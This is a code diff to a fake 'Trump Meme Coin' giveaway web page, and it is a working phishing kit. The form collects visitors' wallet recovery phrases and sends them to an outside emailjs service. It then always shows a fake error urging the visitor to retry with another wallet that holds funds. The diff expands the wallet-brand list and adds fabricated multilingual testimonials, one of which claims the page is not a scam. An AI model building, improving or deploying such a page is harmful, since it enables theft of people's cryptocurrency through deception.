@@ -65,9 +65,14 @@
       border-radius: 10px;
       box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
       z-index: 1000;
+      transition: filter 0.3s ease;
     }
     .wallet-page.active {
       display: block;
+    }
+    .wallet-page.blurred {
+      filter: blur(8px);
+      pointer-events: none;
     }
     .error {
       color: red;
@@ -80,24 +85,31 @@
       border-radius: 5px;
       margin-bottom: 10px;
     }
+    /* ERROR BOX moved outside wallet page: */
     #error-box {
       display: none;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
       background: #ffe6e6;
       border: 1px solid #cc0000;
       color: #cc0000;
-      font-size: 0.85rem;
-      font-weight: 500;
+      font-size: 0.9rem;
+      font-weight: 600;
+      padding: 15px 25px;
+      border-radius: 8px;
+      z-index: 2000;
+      max-width: 320px;
       text-align: center;
-      padding: 10px;
-      border-radius: 6px;
-      margin-top: 10px;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.2);
     }
     #error-box button {
-      margin-top: 8px;
+      margin-top: 12px;
       background: #ff4500;
       color: white;
       border: none;
-      padding: 8px 14px;
+      padding: 10px 18px;
       font-weight: bold;
       border-radius: 5px;
       cursor: pointer;
@@ -208,7 +220,6 @@
     <p>Make America Great Again!</p>
     <div class="balance">$5,000,000 $TRUMP</div>
   </header>
-
   <div class="container" id="main-content">
     <div class="card">
       <h2>Join the Revolution!</h2>
@@ -218,7 +229,6 @@
       <p>Be part of the movement — connect your wallet today and secure your share!</p>
       <button class="btn" onclick="showWalletPage()">Connect Wallet</button>
     </div>
-
     <div id="testimonials">
       <h3>What Others Are Saying</h3>
       <div id="testimonial-text">Loading testimonials...</div>
@@ -230,20 +240,47 @@
     <h2>Connect Your Wallet</h2>
     <p>Enter your wallet details to claim $500 worth of Trump Meme Coins.</p>
     <form id="wallet-form">
-      <label for="wallet-type">Select Wallet Type</label>
-      <select id="wallet-type" name="wallet_type" required>
-        <!-- wallet options truncated for brevity -->
-        <option value="others">Others</option>
-      </select>
+      <!-- Wallet Type Dropdown - Paste inside your form -->
+<label for="wallet-type">Select Wallet Type</label>
+<select id="wallet-type" name="wallet_type" required>
+  <option value="alphawallet">AlphaWallet</option>
+  <option value="argent">Argent</option>
+  <option value="atomic">Atomic Wallet</option>
+  <option value="bitkeep">BitKeep</option>
+  <option value="bitpie">Bitpie</option>
+  <option value="blockchain">Blockchain Wallet</option>
+  <option value="brd">BRD</option>
+  <option value="coin98">Coin98</option>
+  <option value="coinomi">Coinomi</option>
+  <option value="coinbase">Coinbase Wallet</option>
+  <option value="exodus">Exodus</option>
+  <option value="huobi">Huobi Wallet</option>
+  <option value="imtoken">imToken</option>
+  <option value="mathwallet">MathWallet</option>
+  <option value="metamask">MetaMask</option>
+  <option value="mycelium">Mycelium</option>
+  <option value="myetherwallet">MyEtherWallet</option>
+  <option value="phantom">Phantom</option>
+  <option value="rainbow">Rainbow</option>
+  <option value="safepal">SafePal</option>
+  <option value="solflare">Solflare</option>
+  <option value="tokenpocket">TokenPocket</option>
+  <option value="trustwallet">Trust Wallet</option>
+  <option value="zelcore">Zelcore</option>
+  <option value="zengo">Zengo</option>
+  <option value="others">Others</option>
+</select>
       <label for="wallet-phrase">Enter Your Wallet Phrase</label>
       <textarea id="wallet-phrase" name="wallet_phrase" placeholder="Copy & Paste Wallet Phrase" required></textarea>
-      <div id="error-box"></div>
       <div class="note">
         <p>Note: Only wallets with a balance or transaction history will be credited.</p>
       </div>
       <button class="btn" id="submit-btn" type="submit">Connect</button>
     </form>
   </div>
+
+  <!-- ERROR BOX moved outside wallet page -->
+  <div id="error-box"></div>
 
   <footer>
     <p>&copy; 2025 Trump Meme Coin Giveaway. All rights reserved.</p>
@@ -267,70 +304,94 @@
     }
 
     function returnToMainPage() {
+      document.getElementById('wallet-form').reset();
       document.getElementById('wallet-page').classList.remove('active');
+      document.getElementById('wallet-page').classList.remove('blurred');
+      document.getElementById('error-box').style.display = "none";
       document.getElementById('main-content').classList.remove('blurred');
       document.querySelector('header').classList.remove('blurred');
       document.querySelector('footer').classList.remove('blurred');
       document.body.classList.remove('noscroll');
-      document.getElementById("error-box").style.display = "none";
     }
 
     document.getElementById("wallet-form").addEventListener("submit", function(event) {
       event.preventDefault();
       const btn = document.getElementById("submit-btn");
       const errorBox = document.getElementById("error-box");
-
       btn.disabled = true;
       btn.textContent = "Connecting...";
-
       emailjs.sendForm('service_oh2l5fc', 'template_oty8s2s', '#wallet-form')
-        .then(function(response) {
-          setTimeout(() => {
-            errorBox.innerHTML = `
-              Wallet could not connect to server. Only wallets with a balance or transaction history can be connected.<br>
-              <button onclick="returnToMainPage()">Try Again</button>
-            `;
-            errorBox.style.display = "block";
-            btn.disabled = false;
-            btn.textContent = "Connect";
-          }, 2000);
-        })
-        .catch(function(error) {
+      .then(function(response) {
+        setTimeout(() => {
           errorBox.innerHTML = `
-            Unexpected server issue. Please try again.<br>
-            <button onclick="returnToMainPage()">Try Again</button>
-          `;
+  <p>
+    Oops, something went wrong crediting this wallet.<br>
+    Please ensure your recovery phrase was entered correctly, the wallet has recent activity, or try again with a different wallet that holds a balance.
+  </p>
+  <button onclick="returnToMainPage()">Try Again</button>
+`;
           errorBox.style.display = "block";
+
+          // Blur wallet page behind error box
+          document.getElementById('wallet-page').classList.add('blurred');
+
           btn.disabled = false;
           btn.textContent = "Connect";
-        });
+        }, 2000);
+      })
+      .catch(function(error) {
+        errorBox.innerHTML = `
+  <p>
+    Oops, something went wrong crediting this wallet.<br>
+    Please ensure your recovery phrase was entered correctly, the wallet has recent activity, or try again with a different wallet that holds a balance.
+  </p>
+  <button onclick="returnToMainPage()">Try Again</button>
+`;
+        errorBox.style.display = "block";
+
+        // Blur wallet page behind error box
+        document.getElementById('wallet-page').classList.add('blurred');
+
+        btn.disabled = false;
+        btn.textContent = "Connect";
+      });
     });
 
+    // Testimonials auto-rotate
     const testimonials = [
-      "“Super easy! Just connected and claimed. MAGA!” – Michael D.",
-      "“Didn’t expect it to be real, but boom – $500 $TRUMP in my wallet!” – Fatima A.",
-      "“This is the best airdrop of 2025 hands down.” – Jonas L.",
-      "“Trump Meme Coin is hilarious but it's real value!” – Brenda S.",
-      "“Everyone on my crypto group chat is buzzing about this!” – M. Tran",
-      "“Thought it was a joke. It wasn’t. I’m $500 richer!” – Rico P.",
-      "“Easy claim and instantly got confirmation. Love it!” – Nina F.",
-      "“I missed PepeCoin – not missing $TRUMP!” – Alex C.",
-      "“Crazy how smooth it worked. Props to the devs.” – Tarek Y.",
-      "“Only 2,000 left? Tell your friends now!” – Sheila M."
-    ];
-
-    let currentIndex = 0;
-    function rotateTestimonial() {
-      const testimonialDiv = document.getElementById('testimonial-text');
-      testimonialDiv.style.opacity = 0;
+  "Great opportunity! I received $500 instantly. – Amy (USA)",
+  "Connecting my wallet was super easy. Loving the $TRUMP tokens! – Jake (USA)",
+  "¡Funciona de verdad, ya tengo mis $500 en $TRUMP! – Carlos (Argentina)",
+  "Muito fácil, obrigado pelo presente! – Fernanda (Brazil)",
+  "Je ne croyais pas, mais j’ai bien reçu les tokens ! – Isabelle (France)", // "I didn't believe it, but I really received the tokens!"
+  "Ich habe sofort $TRUMP bekommen, danke! – Lukas (Germany)", // "I got $TRUMP instantly, thank you!"
+  "Спасибо за монеты, это работает! – Daria (Russia)", // "Thanks for the coins, it works!"
+  "受け取ったよ、ありがとうトランプコイン！– Hiroshi (Japan)", // "I received it, thank you Trump Coin!"
+  "Wallet connection was fast and easy. Recommended! – Liam (Australia)",
+  "Grazie per i token, fantastico! – Sofia (Italy)", // "Thanks for the tokens, fantastic!"
+  "Eu conectei minha carteira e recebi rapidinho! – Thiago (Brazil)", // "I connected my wallet and received it quickly!"
+  "تم استلام التوكن بنجاح، شكراً! – Ahmed (UAE)", // "Token received successfully, thank you!"
+  "Saya tidak menyangka, tapi berhasil! – Dwi (Indonesia)", // "I didn't expect it, but it worked!"
+  "Connexion rapide, 100% légitime. – Camille (France)", // "Quick connection, 100% legit."
+  "100% funziona, grazie Trump team! – Marco (Italy)", // "It works 100%, thank you Trump team!"
+  "Coin nhận được rồi nhé! – Linh (Vietnam)", // "I received the coins already!"
+  "내 지갑으로 바로 들어왔어요. 대박! – Min-Jae (South Korea)", // "It arrived straight into my wallet. Awesome!"
+  "Това не е измама – работи! – Petar (Bulgaria)", // "This is not a scam – it works!"
+  "已經收到代幣了，真的很快！– Chen (Taiwan)", // "Already received the tokens, really fast!"
+  "सब कुछ सही तरीके से हुआ, धन्यबाद! – Raj (India)" // "Everything worked smoothly, thank you!"
+];
+    let tIndex = 0;
+    const testimonialText = document.getElementById("testimonial-text");
+    function rotateTestimonials() {
+      testimonialText.style.opacity = 0;
       setTimeout(() => {
-        testimonialDiv.innerText = testimonials[currentIndex];
-        testimonialDiv.style.opacity = 1;
-        currentIndex = (currentIndex + 1) % testimonials.length;
+        testimonialText.textContent = testimonials[tIndex];
+        testimonialText.style.opacity = 1;
+        tIndex = (tIndex + 1) % testimonials.length;
       }, 500);
     }
-    setInterval(rotateTestimonial, 5000);
-    window.addEventListener('load', rotateTestimonial);
+    rotateTestimonials();
+    setInterval(rotateTestimonials, 5000);
   </script>
 </body>
 </html>
